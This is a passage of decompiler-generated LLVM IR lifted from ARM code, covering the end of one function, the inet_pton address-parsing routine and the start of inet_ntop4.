  %v0_1cca4 = load i32, i32* @lr, align 4
  %v2_1cca4 = icmp eq i32 %v0_1cca4, 0
  store i1 %v2_1cca4, i1* %cpsr_z.global-to-local, align 1
  %v1_1cca8 = trunc i32 %v4_1cc98 to i8
  store i8 %v1_1cca8, i8* %v1_1cc94, align 1
  %v0_1ccac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ccac, label %dec_label_pc_1ccb0, label %dec_label_pc_1cce8.backedge

dec_label_pc_1ccb0:                               ; preds = %dec_label_pc_1cca4
  %v0_1ccb0 = load i32, i32* @ip, align 4
  %v1_1ccb0 = add i32 %v0_1ccb0, 1
  store i32 %v1_1ccb0, i32* @ip, align 4
  %v7_1ccb4 = icmp eq i32 %v1_1ccb0, 4
  store i1 %v7_1ccb4, i1* %cpsr_z.global-to-local, align 1
  %v0_1ccb8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1ccb8, i32* @lr, align 4
  %v8_1ccbc = icmp sgt i32 %v1_1ccb0, 4
  br i1 %v8_1ccbc, label %dec_label_pc_1cd1c, label %dec_label_pc_1cce8.backedge

dec_label_pc_1ccc4:                               ; preds = %dec_label_pc_1cc88
  %v7_1ccc4 = icmp eq i32 %v0_1ccc4, 46
  %v1_1cccc = load i32, i32* @lr, align 4
  %v2_1cccc = urem i32 %v1_1cccc, 2
  %storemerge12 = select i1 %v7_1ccc4, i32 %v2_1cccc, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_1ccd0 = icmp eq i32 %storemerge12, 0
  store i1 %v2_1ccd0, i1* %cpsr_z.global-to-local, align 1
  %v0_1ccd4 = load i32, i32* @r5, align 4
  store i32 %v0_1ccd4, i32* @lr, align 4
  br i1 %v2_1ccd0, label %dec_label_pc_1cd1c, label %dec_label_pc_1ccdc

dec_label_pc_1ccdc:                               ; preds = %dec_label_pc_1ccc4
  %v0_1ccdc = load i32, i32* @ip, align 4
  %v7_1ccdc = icmp eq i32 %v0_1ccdc, 4
  store i1 %v7_1ccdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ccdc, label %dec_label_pc_1cd1c, label %dec_label_pc_1cce4

dec_label_pc_1cce4:                               ; preds = %dec_label_pc_1ccdc
  %v1_1cce4 = trunc i32 %v0_1ccd4 to i8
  %v2_1cce4 = load i32, i32* %r1.global-to-local, align 4
  %v3_1cce4 = add i32 %v2_1cce4, 1
  %v4_1cce4 = inttoptr i32 %v3_1cce4 to i8*
  store i8 %v1_1cce4, i8* %v4_1cce4, align 1
  %v5_1cce4 = load i32, i32* %r1.global-to-local, align 4
  %v6_1cce4 = add i32 %v5_1cce4, 1
  store i32 %v6_1cce4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1cce8.backedge

dec_label_pc_1cce8.backedge:                      ; preds = %dec_label_pc_1cce4, %dec_label_pc_1cca4, %dec_label_pc_1ccb0
  %v0_1cce8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1cce8 = inttoptr i32 %v0_1cce8 to i8*
  %v2_1cce8 = load i8, i8* %v1_1cce8, align 1
  %v3_1cce8 = zext i8 %v2_1cce8 to i32
  store i32 %v3_1cce8, i32* @r3, align 4
  %v2_1ccec = icmp eq i8 %v2_1cce8, 0
  store i1 %v2_1ccec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ccec, label %dec_label_pc_1cce8.dec_label_pc_1ccf8_crit_edge, label %dec_label_pc_1cc88

dec_label_pc_1cce8.dec_label_pc_1ccf8_crit_edge:  ; preds = %dec_label_pc_1cce8.backedge
  %v0_1ccf8.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1ccf8

dec_label_pc_1ccf8:                               ; preds = %dec_label_pc_1cce8.dec_label_pc_1ccf8_crit_edge, %entry
  %v0_1ccf8 = phi i32 [ %v0_1ccf8.pre, %dec_label_pc_1cce8.dec_label_pc_1ccf8_crit_edge ], [ 0, %entry ]
  %v7_1ccf8 = icmp eq i32 %v0_1ccf8, 3
  store i1 %v7_1ccf8, i1* %cpsr_z.global-to-local, align 1
  %v7_1ccfc = icmp slt i32 %v0_1ccf8, 4
  br i1 %v7_1ccfc, label %dec_label_pc_1cd1c, label %dec_label_pc_1cd00

dec_label_pc_1cd00:                               ; preds = %dec_label_pc_1ccf8
  %v0_1cd00 = load i32, i32* @r4, align 4
  store i32 %v0_1cd00, i32* @r0, align 4
  store i32 %v2_1cc70, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1cd0c = call i32 @memcpy()
  br label %dec_label_pc_1cd1c

dec_label_pc_1cd1c:                               ; preds = %dec_label_pc_1cc94, %dec_label_pc_1ccb0, %dec_label_pc_1ccc4, %dec_label_pc_1ccdc, %dec_label_pc_1ccf8, %dec_label_pc_1cd00
  %storemerge = phi i32 [ 1, %dec_label_pc_1cd00 ], [ 0, %dec_label_pc_1ccf8 ], [ 0, %dec_label_pc_1ccdc ], [ 0, %dec_label_pc_1ccc4 ], [ 0, %dec_label_pc_1ccb0 ], [ 0, %dec_label_pc_1cc94 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_1cc58, i32* @r4, align 4
  store i32 %v6_1cc58, i32* @r5, align 4
  store i32 %v15_1cc58, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1ccf8, { 1, 0 }
  uselistorder i32 %v3_1cce8, { 2, 1, 0 }
  uselistorder i32 %v0_1cce8, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_1cc98, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder label %dec_label_pc_1cd1c, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1cce8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1cc88, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_1cd28 = load i32, i32* @r4, align 4
  %v6_1cd28 = load i32, i32* @r5, align 4
  %v9_1cd28 = load i32, i32* @r6, align 4
  %v12_1cd28 = load i32, i32* @r7, align 4
  %v27_1cd28 = load i32, i32* @lr, align 4
  %v7_1cd34 = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_1cd34, label %dec_label_pc_1cd54, label %dec_label_pc_1cd48

dec_label_pc_1cd48:                               ; preds = %entry
  %v7_1cd48 = icmp eq i32 %arg1, 10
  br i1 %v7_1cd48, label %dec_label_pc_1cd64, label %dec_label_pc_1cf1c

dec_label_pc_1cd54:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_1cd5c = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_1cf2c

dec_label_pc_1cd64:                               ; preds = %dec_label_pc_1cd48
  %v2_1cd64 = ptrtoint i32* %stack_var_-56 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_1cd70 = bitcast i32* %stack_var_-56 to i8*
  %v3_1cd70 = call i32 @__GI_memset(i8* %v2_1cd70, i32 0)
  %v0_1cd74 = load i32, i32* @r5, align 4
  %v1_1cd74 = inttoptr i32 %v0_1cd74 to i8*
  %v2_1cd74 = load i8, i8* %v1_1cd74, align 1
  %v3_1cd74 = zext i8 %v2_1cd74 to i32
  store i32 %v3_1cd74, i32* %r3.global-to-local, align 4
  %v7_1cd78 = icmp eq i8 %v2_1cd74, 58
  store i32 %v3_1cd70, i32* @r6, align 4
  %v2_1cd80 = add i32 %v3_1cd70, 16
  store i32 %v2_1cd80, i32* %r8.global-to-local, align 4
  br i1 %v7_1cd78, label %dec_label_pc_1cd88, label %dec_label_pc_1cd94

dec_label_pc_1cd88:                               ; preds = %dec_label_pc_1cd64
  %v1_1cd88 = add i32 %v0_1cd74, 1
  %v2_1cd88 = inttoptr i32 %v1_1cd88 to i8*
  %v3_1cd88 = load i8, i8* %v2_1cd88, align 1
  %v4_1cd88 = zext i8 %v3_1cd88 to i32
  store i32 %v4_1cd88, i32* %r3.global-to-local, align 4
  store i32 %v1_1cd88, i32* @r5, align 4
  %v7_1cd8c = icmp eq i8 %v3_1cd88, 58
  br i1 %v7_1cd8c, label %dec_label_pc_1cd94, label %dec_label_pc_1cf14

dec_label_pc_1cd94:                               ; preds = %dec_label_pc_1cd88, %dec_label_pc_1cd64
  %v0_1cda0 = phi i32 [ %v1_1cd88, %dec_label_pc_1cd88 ], [ %v0_1cd74, %dec_label_pc_1cd64 ]
  store i32 -32972, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_1cd9c = load i32, i32* @r4, align 4
  %v2_1cd9c = add i32 %v0_1cd9c, -32972
  store i32 %v0_1cda0, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_1cd9c, i32* %stack_var_-64, align 4
  %v1_1ce783 = inttoptr i32 %v0_1cda0 to i8*
  %v2_1ce784 = load i8, i8* %v1_1ce783, align 1
  %v3_1ce785 = zext i8 %v2_1ce784 to i32
  store i32 %v3_1ce785, i32* @r4, align 4
  %v2_1ce7c6 = icmp eq i8 %v2_1ce784, 0
  br i1 %v2_1ce7c6, label %dec_label_pc_1ce84.thread, label %dec_label_pc_1cdb4

dec_label_pc_1ce84.thread:                        ; preds = %dec_label_pc_1cd94
  store i32 %v3_1cd70, i32* @r4, align 4
  br label %dec_label_pc_1ceb0

dec_label_pc_1cdb4:                               ; preds = %dec_label_pc_1cd94, %dec_label_pc_1ce78.backedge.dec_label_pc_1cdb4_crit_edge
  %v0_1cdb8 = phi i32 [ %v3_1ce78, %dec_label_pc_1ce78.backedge.dec_label_pc_1cdb4_crit_edge ], [ %v3_1ce785, %dec_label_pc_1cd94 ]
  %v2_1cdb4 = phi i32 [ %v2_1cdb4.pre, %dec_label_pc_1ce78.backedge.dec_label_pc_1cdb4_crit_edge ], [ %v2_1cd9c, %dec_label_pc_1cd94 ]
  store i32 %v2_1cdb4, i32* @r0, align 4
  %v1_1cdb8 = or i32 %v0_1cdb8, 32
  store i32 %v1_1cdb8, i32* %r1.global-to-local, align 4
  %v2_1cdbc = call i32 @__GI_strchr(i32 %v2_1cdb4, i32 %v1_1cdb8)
  %v2_1cdc0 = icmp eq i32 %v2_1cdbc, 0
  %v0_1cdc4 = load i32, i32* @r5, align 4
  %v1_1cdc4 = add i32 %v0_1cdc4, 1
  store i32 %v1_1cdc4, i32* @r5, align 4
  br i1 %v2_1cdc0, label %dec_label_pc_1cde8, label %dec_label_pc_1cdcc

dec_label_pc_1cdcc:                               ; preds = %dec_label_pc_1cdb4
  %v2_1cdcc = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1cdcc, i32* %r2.global-to-local, align 4
  %v2_1cdd0 = sub i32 %v2_1cdbc, %v2_1cdcc
  %v1_1cdd4 = load i32, i32* @r7, align 4
  %v4_1cdd4 = mul i32 %v1_1cdd4, 16
  %v5_1cdd4 = or i32 %v4_1cdd4, %v2_1cdd0
  store i32 %v5_1cdd4, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_1cdd4, 65536
  br i1 %tmp36, label %dec_label_pc_1ce74, label %dec_label_pc_1cf14

dec_label_pc_1cde8:                               ; preds = %dec_label_pc_1cdb4
  %v0_1cde8 = load i32, i32* @r4, align 4
  %v7_1cde8 = icmp eq i32 %v0_1cde8, 58
  br i1 %v7_1cde8, label %dec_label_pc_1cdf0, label %dec_label_pc_1ce48

dec_label_pc_1cdf0:                               ; preds = %dec_label_pc_1cde8
  %v0_1cdf0 = load i32, i32* %sb.global-to-local, align 4
  %v2_1cdf0 = icmp eq i32 %v0_1cdf0, 0
  br i1 %v2_1cdf0, label %dec_label_pc_1cdf8, label %dec_label_pc_1ce0c

dec_label_pc_1cdf8:                               ; preds = %dec_label_pc_1cdf0
  %v0_1cdf8 = load i32, i32* %fp.global-to-local, align 4
  %v2_1cdf8 = icmp eq i32 %v0_1cdf8, 0
  br i1 %v2_1cdf8, label %dec_label_pc_1ce00, label %dec_label_pc_1cf14

dec_label_pc_1ce00:                               ; preds = %dec_label_pc_1cdf8
  %v0_1ce00 = load i32, i32* @r6, align 4
  store i32 %v0_1ce00, i32* %fp.global-to-local, align 4
  store i32 %v1_1cdc4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1ce78.backedge

dec_label_pc_1ce0c:                               ; preds = %dec_label_pc_1cdf0
  %v1_1ce0c = inttoptr i32 %v1_1cdc4 to i8*
  %v2_1ce0c = load i8, i8* %v1_1ce0c, align 1
  %v3_1ce0c = zext i8 %v2_1ce0c to i32
  store i32 %v3_1ce0c, i32* %r3.global-to-local, align 4
  %v2_1ce10 = icmp eq i8 %v2_1ce0c, 0
  br i1 %v2_1ce10, label %dec_label_pc_1cf14, label %dec_label_pc_1ce18

dec_label_pc_1ce18:                               ; preds = %dec_label_pc_1ce0c
  %v0_1ce18 = load i32, i32* @r6, align 4
  %v1_1ce18 = add i32 %v0_1ce18, 2
  store i32 %v1_1ce18, i32* %r3.global-to-local, align 4
  %v1_1ce1c = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_1ce18, %v1_1ce1c
  br i1 %tmp37, label %dec_label_pc_1cf14, label %dec_label_pc_1ce24

dec_label_pc_1ce24:                               ; preds = %dec_label_pc_1ce18
  %v0_1ce24 = load i32, i32* @r7, align 4
  %v3_1ce24 = udiv i32 %v0_1ce24, 256
  store i32 %v3_1ce24, i32* %r2.global-to-local, align 4
  store i32 %v0_1ce18, i32* %r3.global-to-local, align 4
  %v1_1ce2c = trunc i32 %v3_1ce24 to i8
  %v3_1ce2c = inttoptr i32 %v0_1ce18 to i8*
  store i8 %v1_1ce2c, i8* %v3_1ce2c, align 1
  %v4_1ce2c = load i32, i32* %r3.global-to-local, align 4
  %v5_1ce2c = add i32 %v4_1ce2c, 1
  store i32 %v5_1ce2c, i32* @r3, align 4
  %v0_1ce30 = load i32, i32* @r7, align 4
  %v1_1ce30 = trunc i32 %v0_1ce30 to i8
  %v2_1ce30 = load i32, i32* @r6, align 4
  %v3_1ce30 = add i32 %v2_1ce30, 1
  %v4_1ce30 = inttoptr i32 %v3_1ce30 to i8*
  store i8 %v1_1ce30, i8* %v4_1ce30, align 1
  store i32 0, i32* @r7, align 4
  %v0_1ce38 = load i32, i32* @r3, align 4
  %v1_1ce38 = add i32 %v0_1ce38, 1
  store i32 %v1_1ce38, i32* @r6, align 4
  %v0_1ce3c = load i32, i32* @r5, align 4
  store i32 %v0_1ce3c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1ce78.backedge

dec_label_pc_1ce48:                               ; preds = %dec_label_pc_1cde8
  %v7_1ce48 = icmp eq i32 %v0_1cde8, 46
  br i1 %v7_1ce48, label %dec_label_pc_1ce50, label %dec_label_pc_1cf14

dec_label_pc_1ce50:                               ; preds = %dec_label_pc_1ce48
  %v0_1ce50 = load i32, i32* @r6, align 4
  %v1_1ce50 = add i32 %v0_1ce50, 4
  store i32 %v1_1ce50, i32* @r4, align 4
  %v1_1ce54 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1ce50, %v1_1ce54
  br i1 %tmp38, label %dec_label_pc_1cf14, label %dec_label_pc_1ce5c

dec_label_pc_1ce5c:                               ; preds = %dec_label_pc_1ce50
  %v0_1ce5c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_1ce5c, i32* @r0, align 4
  store i32 %v0_1ce50, i32* %r1.global-to-local, align 4
  %v3_1ce64 = call i32 @inet_pton4(i32 %v0_1ce5c, i32 %v0_1ce50)
  %v5_1ce6c = icmp sgt i32 %v3_1ce64, 0
  br i1 %v5_1ce6c, label %dec_label_pc_1ce5c.dec_label_pc_1ceb0_crit_edge, label %dec_label_pc_1cf14

dec_label_pc_1ce5c.dec_label_pc_1ceb0_crit_edge:  ; preds = %dec_label_pc_1ce5c
  %v0_1cef4.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1ceb0

dec_label_pc_1ce74:                               ; preds = %dec_label_pc_1cdcc
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1ce78.backedge

dec_label_pc_1ce78.backedge:                      ; preds = %dec_label_pc_1ce74, %dec_label_pc_1ce00, %dec_label_pc_1ce24
  %v0_1ce78 = phi i32 [ %v1_1cdc4, %dec_label_pc_1ce74 ], [ %v1_1cdc4, %dec_label_pc_1ce00 ], [ %v0_1ce3c, %dec_label_pc_1ce24 ]
  %v0_1ce8412 = phi i32 [ 1, %dec_label_pc_1ce74 ], [ 0, %dec_label_pc_1ce00 ], [ 0, %dec_label_pc_1ce24 ]
  %v1_1ce78 = inttoptr i32 %v0_1ce78 to i8*
  %v2_1ce78 = load i8, i8* %v1_1ce78, align 1
  %v3_1ce78 = zext i8 %v2_1ce78 to i32
  store i32 %v3_1ce78, i32* @r4, align 4
  %v2_1ce7c = icmp eq i8 %v2_1ce78, 0
  br i1 %v2_1ce7c, label %dec_label_pc_1ce84, label %dec_label_pc_1ce78.backedge.dec_label_pc_1cdb4_crit_edge

dec_label_pc_1ce78.backedge.dec_label_pc_1cdb4_crit_edge: ; preds = %dec_label_pc_1ce78.backedge
  %v2_1cdb4.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1cdb4

dec_label_pc_1ce84:                               ; preds = %dec_label_pc_1ce78.backedge
  %v0_1ce88.pre = load i32, i32* @r6, align 4
  %v2_1ce84 = icmp eq i32 %v0_1ce8412, 0
  store i32 %v0_1ce88.pre, i32* @r4, align 4
  br i1 %v2_1ce84, label %dec_label_pc_1ceb0, label %dec_label_pc_1ce90

dec_label_pc_1ce90:                               ; preds = %dec_label_pc_1ce84
  %v1_1ce90 = add i32 %v0_1ce88.pre, 2
  store i32 %v1_1ce90, i32* %r3.global-to-local, align 4
  %v1_1ce94 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1ce90, %v1_1ce94
  br i1 %tmp39, label %dec_label_pc_1cf14, label %dec_label_pc_1ce9c

dec_label_pc_1ce9c:                               ; preds = %dec_label_pc_1ce90
  store i32 %v0_1ce88.pre, i32* %r3.global-to-local, align 4
  %v0_1cea0 = load i32, i32* @r7, align 4
  %v3_1cea0 = udiv i32 %v0_1cea0, 256
  store i32 %v3_1cea0, i32* %r2.global-to-local, align 4
  %v1_1cea4 = trunc i32 %v3_1cea0 to i8
  %v3_1cea4 = inttoptr i32 %v0_1ce88.pre to i8*
  store i8 %v1_1cea4, i8* %v3_1cea4, align 1
  %v4_1cea4 = load i32, i32* %r3.global-to-local, align 4
  %v5_1cea4 = add i32 %v4_1cea4, 1
  store i32 %v5_1cea4, i32* @r3, align 4
  %v0_1cea8 = load i32, i32* @r7, align 4
  %v1_1cea8 = trunc i32 %v0_1cea8 to i8
  %v2_1cea8 = load i32, i32* @r6, align 4
  %v3_1cea8 = add i32 %v2_1cea8, 1
  %v4_1cea8 = inttoptr i32 %v3_1cea8 to i8*
  store i8 %v1_1cea8, i8* %v4_1cea8, align 1
  %v0_1ceac = load i32, i32* @r3, align 4
  %v1_1ceac = add i32 %v0_1ceac, 1
  store i32 %v1_1ceac, i32* @r4, align 4
  br label %dec_label_pc_1ceb0

dec_label_pc_1ceb0:                               ; preds = %dec_label_pc_1ce5c.dec_label_pc_1ceb0_crit_edge, %dec_label_pc_1ce84.thread, %dec_label_pc_1ce84, %dec_label_pc_1ce9c
  %v0_1cef4.pre = phi i32 [ %v0_1cef4.pre.pre, %dec_label_pc_1ce5c.dec_label_pc_1ceb0_crit_edge ], [ %v3_1cd70, %dec_label_pc_1ce84.thread ], [ %v0_1ce88.pre, %dec_label_pc_1ce84 ], [ %v1_1ceac, %dec_label_pc_1ce9c ]
  %v0_1ceb0 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ceb0 = icmp eq i32 %v0_1ceb0, 0
  %v1_1cef4.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1ceb0, label %dec_label_pc_1cef4, label %dec_label_pc_1ceb8

dec_label_pc_1ceb8:                               ; preds = %dec_label_pc_1ceb0
  %v9_1ceb8 = icmp eq i32 %v0_1cef4.pre, %v1_1cef4.pre
  %v2_1cebc = sub i32 %v0_1cef4.pre, %v0_1ceb0
  store i32 %v2_1cebc, i32* @ip, align 4
  br i1 %v9_1ceb8, label %dec_label_pc_1cf14, label %dec_label_pc_1cedc.preheader

dec_label_pc_1cedc.preheader:                     ; preds = %dec_label_pc_1ceb8
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_1cedc

dec_label_pc_1ced0:                               ; preds = %dec_label_pc_1cedc
  %v2_1cee4 = sub i32 %v0_1cef0, %v0_1cee8
  %v0_1ced0 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ced0 = add i32 %v0_1ced0, %v2_1cee0
  %v3_1ced0 = inttoptr i32 %v2_1ced0 to i8*
  %v4_1ced0 = load i8, i8* %v3_1ced0, align 1
  %v6_1ced0 = zext i8 %v4_1ced0 to i32
  store i32 %v6_1ced0, i32* @r3, align 4
  %v3_1ced4 = inttoptr i32 %v2_1cee4 to i8*
  store i8 %v4_1ced0, i8* %v3_1ced4, align 1
  %v0_1ced8 = load i32, i32* @lr, align 4
  %v1_1ced8 = trunc i32 %v0_1ced8 to i8
  %v2_1ced8 = load i32, i32* %fp.global-to-local, align 4
  %v3_1ced8 = load i32, i32* %r1.global-to-local, align 4
  %v4_1ced8 = add i32 %v3_1ced8, %v2_1ced8
  %v5_1ced8 = inttoptr i32 %v4_1ced8 to i8*
  store i8 %v1_1ced8, i8* %v5_1ced8, align 1
  %v0_1cedc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1cedc.pre = load i32, i32* @ip, align 4
  %v1_1cee4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1cedc

dec_label_pc_1cedc:                               ; preds = %dec_label_pc_1cedc.preheader, %dec_label_pc_1ced0
  %v0_1cef0 = phi i32 [ %v1_1cef4.pre, %dec_label_pc_1cedc.preheader ], [ %v1_1cee4.pre, %dec_label_pc_1ced0 ]
  %v1_1cee0 = phi i32 [ %v2_1cebc, %dec_label_pc_1cedc.preheader ], [ %v1_1cedc.pre, %dec_label_pc_1ced0 ]
  %v0_1cee8 = phi i32 [ 1, %dec_label_pc_1cedc.preheader ], [ %v0_1cedc.pre, %dec_label_pc_1ced0 ]
  %v2_1cedc = sub i32 %v0_1cee8, %v1_1cee0
  %v4_1cedc = xor i32 %v0_1cee8, %v1_1cee0
  %v5_1cedc = xor i32 %v2_1cedc, %v0_1cee8
  %v6_1cedc = and i32 %v5_1cedc, %v4_1cedc
  %v7_1cedc = icmp slt i32 %v6_1cedc, 0
  %v8_1cedc = icmp slt i32 %v2_1cedc, 0
  %v9_1cedc = icmp eq i32 %v0_1cee8, %v1_1cee0
  %v2_1cee0 = sub i32 %v1_1cee0, %v0_1cee8
  store i32 %v2_1cee0, i32* %r1.global-to-local, align 4
  %v1_1cee8 = add i32 %v0_1cee8, 1
  store i32 %v1_1cee8, i32* %r2.global-to-local, align 4
  %v3_1ceec = xor i1 %v8_1cedc, %v7_1cedc
  %v4_1ceec = or i1 %v9_1cedc, %v3_1ceec
  br i1 %v4_1ceec, label %dec_label_pc_1ced0, label %dec_label_pc_1cef0

dec_label_pc_1cef0:                               ; preds = %dec_label_pc_1cedc
  store i32 %v0_1cef0, i32* @r4, align 4
  br label %dec_label_pc_1cef4

dec_label_pc_1cef4:                               ; preds = %dec_label_pc_1ceb0, %dec_label_pc_1cef0
  %v0_1cef4 = phi i32 [ %v0_1cef0, %dec_label_pc_1cef0 ], [ %v0_1cef4.pre, %dec_label_pc_1ceb0 ]
  %v1_1cef4 = phi i32 [ %v0_1cef0, %dec_label_pc_1cef0 ], [ %v1_1cef4.pre, %dec_label_pc_1ceb0 ]
  %v9_1cef4 = icmp eq i32 %v0_1cef4, %v1_1cef4
  br i1 %v9_1cef4, label %dec_label_pc_1cefc, label %dec_label_pc_1cf14

dec_label_pc_1cefc:                               ; preds = %dec_label_pc_1cef4
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_1cd64, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_1cf08 = call i32 @memcpy()
  br label %dec_label_pc_1cf2c

dec_label_pc_1cf14:                               ; preds = %dec_label_pc_1cdcc, %dec_label_pc_1cdf8, %dec_label_pc_1ce18, %dec_label_pc_1ce0c, %dec_label_pc_1ceb8, %dec_label_pc_1ce5c, %dec_label_pc_1ce48, %dec_label_pc_1cef4, %dec_label_pc_1cd88, %dec_label_pc_1ce90, %dec_label_pc_1ce50
  br label %dec_label_pc_1cf2c

dec_label_pc_1cf1c:                               ; preds = %dec_label_pc_1cd48
  %v0_1cf1c = call i32 @__GI___errno_location()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_1cf24 = inttoptr i32 %v0_1cf1c to i32*
  store i32 97, i32* %v2_1cf24, align 4
  br label %dec_label_pc_1cf2c

dec_label_pc_1cf2c:                               ; preds = %dec_label_pc_1cf14, %dec_label_pc_1cefc, %dec_label_pc_1cd54, %dec_label_pc_1cf1c
  %v1_1cf34 = phi i32 [ 0, %dec_label_pc_1cf14 ], [ 1, %dec_label_pc_1cefc ], [ %v3_1cd5c, %dec_label_pc_1cd54 ], [ -1, %dec_label_pc_1cf1c ]
  store i32 %v3_1cd28, i32* @r4, align 4
  store i32 %v6_1cd28, i32* @r5, align 4
  store i32 %v9_1cd28, i32* @r6, align 4
  store i32 %v12_1cd28, i32* @r7, align 4
  store i32 %v27_1cd28, i32* @lr, align 4
  ret i32 %v1_1cf34

; uselistorder directives
  uselistorder i32 %v2_1cee0, { 1, 0 }
  uselistorder i32 %v2_1cedc, { 1, 0 }
  uselistorder i32 %v0_1cee8, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_1cee0, { 1, 3, 0, 2 }
  uselistorder i32 %v0_1cef0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1cef4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1cef4.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1cea0, { 1, 0 }
  uselistorder i32 %v0_1ce88.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1ce78, { 1, 0 }
  uselistorder i32 %v0_1ce50, { 1, 0, 2 }
  uselistorder i32 %v3_1ce24, { 1, 0 }
  uselistorder i32 %v0_1ce18, { 1, 0, 2 }
  uselistorder i32 %v1_1cdc4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_1cdb4, { 1, 0 }
  uselistorder i32 %v0_1cda0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1cf2c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1cf14, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1cef4, { 1, 0 }
  uselistorder label %dec_label_pc_1cedc, { 1, 0 }
  uselistorder label %dec_label_pc_1ceb0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1ce78.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1cdb4, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
